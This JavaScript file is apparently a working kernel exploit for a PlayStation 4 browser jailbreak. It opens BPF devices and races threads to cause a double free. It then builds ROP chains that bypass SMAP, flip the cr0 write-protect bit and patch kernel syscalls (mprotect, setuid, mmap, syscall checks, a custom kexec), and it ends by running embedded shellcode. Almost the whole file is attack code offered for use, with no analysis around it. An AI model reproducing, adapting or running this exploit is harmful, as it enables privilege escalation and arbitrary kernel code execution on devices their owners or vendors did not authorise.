function kernExploit() {
  try {
    var offsetToWebKit = function (o) {
      return window.webKitBase.add32(o);
    }

    var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
    var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low; 

    if (fd == (-1 >>> 0)) {
      throw "Failed to open first bpf device!"
    }

    // Write BPF programs
    var bpf_valid = p.malloc32(0x4000);
    var bpf_spray = p.malloc32(0x4000);
    var bpf_valid_u32  = bpf_valid.backing;

    var bpf_valid_prog = p.malloc(0x40);
    p.write8(bpf_valid_prog, 0x800 / 8)
    p.write8(bpf_valid_prog.add32(8), bpf_valid)

    var bpf_spray_prog = p.malloc(0x40);
    p.write8(bpf_spray_prog, 0x800 / 8)
    p.write8(bpf_spray_prog.add32(8), bpf_spray)

    for (var i = 0; i < 0x400;) {
      bpf_valid_u32[i++] = 6;
      bpf_valid_u32[i++] = 0;
    }

    var rtv = p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);

    if(rtv.low != 0) {
      throw "Failed to open first bpf device!";
    }

    // Spawn thread
    var spawnthread = function (name, chain) {
      var longjmp = window.webKitBase.add32(0x14e8);
      var createThread = window.webKitBase.add32(0x779390);
      var contextp = p.malloc32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      var thread2 = new rop();
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      chain(thread2);
      p.write8(contextp, window.gadgets["ret"]);
      p.write8(contextp.add32(0x10), thread2.stackBase);
      p.syscall(324, 1);
      var retv = function () { p.fcall(createThread, longjmp, contextp, p.stringify(name)); }
      window.nogc.push(contextp);
      window.nogc.push(thread2);
      return retv;
    }

    var interrupt1, loop1;
    var interrupt2, loop2;
    var sock = p.syscall(97, 2, 2);
    var kscratch = p.malloc32(0x1000);

    // Racing thread
    var start1 = spawnthread("GottaGoFast", function (thread2) {
      interrupt1 = thread2.stackBase;
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);

      thread2.push(window.gadgets["pop rdi"]);
      thread2.push(fd);
      thread2.push(window.gadgets["pop rsi"]);
      thread2.push(0x8010427B);
      thread2.push(window.gadgets["pop rdx"]);
      thread2.push(bpf_valid_prog);
      thread2.push(window.gadgets["pop rsp"]);
      thread2.push(thread2.stackBase.add32(0x800));
      thread2.count = 0x100;
      var cntr = thread2.count;
      thread2.push(window.syscalls[54]); // ioctl
      thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl

      thread2.push(window.gadgets["pop rdi"]);
      var wherep = thread2.pushSymbolic();
      thread2.push(window.gadgets["pop rsi"]);
      var whatp = thread2.pushSymbolic();
      thread2.push(window.gadgets["mov [rdi], rsi"]);

      thread2.push(window.gadgets["pop rsp"]);

      loop1 = thread2.stackBase.add32(thread2.count * 8);
      thread2.push(0x41414141);

      thread2.finalizeSymbolic(wherep, loop1);
      thread2.finalizeSymbolic(whatp, loop1.sub32(8));
    });

    // start setting up chains
    var krop = new rop();
    var race = new rop();

    /**
      * Qwerty Madness!
      * -
      * This section contains magic. It's for bypassing Sony's ghetto "SMAP".
      * Need to be a level 99 mage to understand this completely (not really but kinda). ~ Specter
     **/

    var ctxp  = p.malloc32(0x2000);
    var ctxp1 = p.malloc32(0x2000);
    var ctxp2 = p.malloc32(0x2000);

    p.write8(bpf_spray.add32(16), ctxp);
    p.write8(ctxp.add32(0x50), 0);
    p.write8(ctxp.add32(0x68), ctxp1);
    var stackshift_from_retaddr = 0;
    p.write8(ctxp1.add32(0x10), offsetToWebKit(0x12A19CD)); // sub rsp

    stackshift_from_retaddr += 8 + 0x58;

    p.write8(ctxp.add32(0), ctxp2);
    p.write8(ctxp.add32(0x10), ctxp2.add32(8));
    p.write8(ctxp2.add32(0x7d0), offsetToWebKit(0x6EF4E5)); // mov rdi, [rdi+0x10]

    var iterbase = ctxp2;

    for (var i = 0; i < 0xf; i++) {
      p.write8(iterbase, offsetToWebKit(0x12A19CD)); // sub rsp
      stackshift_from_retaddr += 8 + 0x58;
      p.write8(iterbase.add32(0x7d0 + 0x20), offsetToWebKit(0x6EF4E5)); // mov rdi, [rdi+0x10]
      p.write8(iterbase.add32(8), iterbase.add32(0x20));
      p.write8(iterbase.add32(0x18), iterbase.add32(0x20 + 8))
      iterbase = iterbase.add32(0x20);
    }

    var raxbase = iterbase;
    var rdibase = iterbase.add32(8);
    var memcpy = get_jmptgt(webKitBase.add32(0xF8));
    memcpy = p.read8(memcpy);

    p.write8(raxbase, offsetToWebKit(0x15CA41B));
    stackshift_from_retaddr += 8;

    p.write8(rdibase.add32(0x70), offsetToWebKit(0x1284834));
    stackshift_from_retaddr += 8;

    p.write8(rdibase.add32(0x18), rdibase);
    p.write8(rdibase.add32(8), krop.stackBase);
    p.write8(raxbase.add32(0x30), window.gadgets["mov rbp, rsp"]);
    p.write8(rdibase, raxbase);
    p.write8(raxbase.add32(0x420), offsetToWebKit(0x272961)); // lea rdi, [rbp - 0x28]
    p.write8(raxbase.add32(0x40), memcpy.add32(0xC2 - 0x90));
    var topofchain = stackshift_from_retaddr + 0x28;
    p.write8(rdibase.add32(0xB0), topofchain);

    for (var i = 0; i < 0x1000 / 8; i++) {
      p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
    }

    krop.count = 0x10;

    /**
      * End of Qwerty madness
     **/

    /**
      * Bit of info:
      * -
      * The "kchain" buffer is used to store the kernel ROP chain, and is managed by the "krop" class defined in rop.js.
      * There are also two helper functions for the class, "kpatch" and "kpatch2" for patching the kernel defined below.
      * The "kchainstack" buffer should not be used directly as it is managed by the "krop" class!
      * -
      * The "kscratch" buffer is used to save context. The layout is as follows:
      * kscratch + 0x00: contents of rax register (points to kernel base + 0x16DB6C)
      * kscratch + 0x08: pointer to function stub that manipulates cr0 (mov rax, cr0; or rax, 5002Ah; mov cr0, rax; ret)
      * kscratch + 0x10: contents of cr0 before the write protection bit is flipped for kernel patching
      * kscratch + 0x18: pointer to kscratch
      * kscratch + 0x40: "pop rax" gadget
      * kscratch + 0x420: "pop rdi" gadget
     **/

    // Helper function for patching kernel
    var kpatch = function(offset, qword) {
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(qword);
      krop.push(window.gadgets["mov [rax], rsi"]);
    }

    // Helper function for patching kernel with information from kernel.text
    var kpatch2 = function(offset, offset2) {
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["mov rdi, rax"]);
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset2);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["mov [rdi], rax"]);
    }

    p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
    p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
    p.write8(kscratch.add32(0x18), kscratch);

    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x18));
    krop.push(window.gadgets["mov rbp, rsp"]);

    var rboff = topofchain - krop.count * 8 + 0x28;

    krop.push(offsetToWebKit(0x272961)); // lea rdi, [rbp - 0x28]
    krop.push(window.gadgets["pop rax"]);
    krop.push(rboff);
    krop.push(window.gadgets["add rdi, rax"]);

    krop.push(window.gadgets["mov rax, [rdi]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x2FA);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov [rdi], rax"]);

    var shellbuf = p.malloc32(0x1000);

    // Save context of cr0 register
    krop.push(window.gadgets["pop rdi"]); // save address in usermode
    krop.push(kscratch);
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0xC54B4);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x08));
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["jmp rax"]);
    krop.push(window.gadgets["pop rdi"]); // save cr0
    krop.push(kscratch.add32(0x10));

    // Disable kernel write protection for .text
    krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
    krop.push(window.gadgets["pop rsi"]);
    krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
    krop.push(window.gadgets["and rax, rsi"]);
    krop.push(window.gadgets["mov rdx, rax"]);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(8));
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x9);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rdi, rax"]);
    krop.push(window.gadgets["mov rax, rdx"]);
    krop.push(window.gadgets["jmp rdi"]);

    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch);
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x3609A);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x330));
    krop.push(window.gadgets["mov [rdi], rax"]);

    // Patch sys_mprotect: Allow RWX mapping
    patch_mprotect = new int64(0x9090FA38, 0x90909090);
    kpatch(0x3609A, patch_mprotect);

    // Patch bpf_cdevsw: add back in bpfwrite() implementation for kernel primitives
    kpatch(0x133C344, shellbuf);

    // Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
    var patch_sys_setuid_offset = new int64(0xFFEE6F06, 0xFFFFFFFF);
    var patch_sys_setuid = new int64(0x000000B8, 0xC4894100);
    kpatch(patch_sys_setuid_offset, patch_sys_setuid);

    // Patch amd64_syscall: syscall instruction allowed anywhere
    var patch_amd64_syscall_offset1 = new int64(0xFFE92927, 0xFFFFFFFF);
    var patch_amd64_syscall_offset2 = new int64(0xFFE92945, 0xFFFFFFFF);
    var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49);
    var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090);
    kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
    kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);

    // Patch: sys_mmap: allow RWX mapping from anywhere
    var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF);
    var patch_sys_mmap = new int64(0x37B64037, 0x3145C031);
    kpatch(patch_sys_mmap_offset, patch_sys_mmap);

    // Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
    var patch_sys_dynlib_dlsym_1 = new int64(0x000000E9, 0x8B489000);
    var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090);
    kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1);
    kpatch(0x144AB4, patch_sys_dynlib_dlsym_2);

    // Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
    var patch_sys_exec_1 = new int64(0x00F0ECB4, 0);
    var patch_sys_exec_2A = new int64(0x00F0ECBC, 0);
    var patch_sys_exec_2B = new int64(0xFFEA58F4, 0xFFFFFFFF);
    var patch_sys_exec_3 = new int64(0x00F0ECDC, 0);
    var patch_sys_exec_param1 = new int64(0x02, 0);
    var patch_sys_exec_param3 = new int64(0, 1);
    kpatch(patch_sys_exec_1, patch_sys_exec_param1);
    kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
    kpatch(patch_sys_exec_3, patch_sys_exec_param3);

    // Enable kernel write protection for .text
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(0x08));
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x09);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rdi, rax"]);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["jmp rdi"]);

    krop.push(offsetToWebKit(0x5CDB9)); // Clean up stack
    krop.push(kscratch.add32(0x1000));

    var kq = p.malloc32(0x10);
    var kev = p.malloc32(0x100);
    kev.backing[0] = sock;
    kev.backing[2] = 0x1ffff;
    kev.backing[3] = 1;
    kev.backing[4] = 5;

    // Shellcode to clean up memory
    var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0xfe402494, 0x8d4dffff, 0xe09024b4, 0x8d4d0010, 0x5e8024ac, 0x81490043, 0x4b7160c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
    for (var i = 0; i < shcode.length; i++) {
      shellbuf.backing[i] = shcode[i];
    }

    // RACE!
    var iters = 0;
    start1();
    while (1) {
      race.count = 0;

      // Create a kqueue
      race.push(window.syscalls[362]);
      race.push(window.gadgets["pop rdi"]);
      race.push(kq);
      race.push(window.gadgets["mov [rdi], rax"]);

      // Race against the other thread
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push(window.gadgets["ret"]);
      race.push_write8(loop1, interrupt1);
      race.push(window.gadgets["pop rdi"]);
      race.push(fd);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_valid_prog);
      race.push(window.syscalls[54]);

      // Attempt to trigger double free()
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["mov rdi, rax"]);
      race.push(window.gadgets["pop rsi"]);
      race.push(kev);
      race.push(window.gadgets["pop rdx"]);
      race.push(1);
      race.push(window.gadgets["pop rcx"]);
      race.push(0);
      race.push(window.gadgets["pop r8"]);
      race.push(0);
      race.push(window.syscalls[363]);

      // Spray via ioctl
      race.push(window.gadgets["pop rdi"]);
      race.push(fd1);
      race.push(window.gadgets["pop rsi"]);
      race.push(0x8010427B);
      race.push(window.gadgets["pop rdx"]);
      race.push(bpf_spray_prog);
      race.push(window.syscalls[54]);

      // Close the poisoned kqueue and run the kROP chain!
      race.push(window.gadgets["pop rax"]);
      race.push(kq);
      race.push(window.gadgets["mov rax, [rax]"]);
      race.push(window.gadgets["mov rdi, rax"]);
      race.push(window.syscalls[6]);
      iters++;

      // Gotta go fast!
      race.run();
      if (kscratch.backing[0] != 0) {
        // Hey, we won!

        // Clean up memory
        p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
        p.fcall(shellbuf);

        // Refresh to a clean page
        location.reload();

        return true;
      }
    }
  } catch(ex) {
    fail(ex)
  }

  // failed
  return false;
}

kernExploit();
